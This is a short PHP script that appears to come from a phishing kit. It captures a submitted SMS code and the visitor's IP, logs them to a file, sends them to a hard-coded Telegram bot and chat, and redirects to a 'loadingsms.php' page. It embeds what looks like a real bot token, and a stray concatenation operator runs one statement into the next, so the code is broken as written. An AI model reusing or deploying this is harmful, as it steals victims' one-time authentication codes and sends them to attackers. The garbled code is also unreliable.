<?php
$subject = "My subject";
$ip = getenv("REMOTE_ADDR");
$text =  "IP :" . $ip .  "\nSMS  :" . $_POST['msg'] . 
$result = @fopen("./data/logs/AntiBomb_RZT.txt", "a+");
					fwrite($result, $text);
					file_get_contents("https://api.telegram.org/bot5421145021:AAFP9HIh6oIPI-OkoUDII6Y6qiaYhTRu-jg/sendMessage?chat_id=-677328663&text=" . urlencode($text)."" );
header("Location: loadingsms.php")
?>
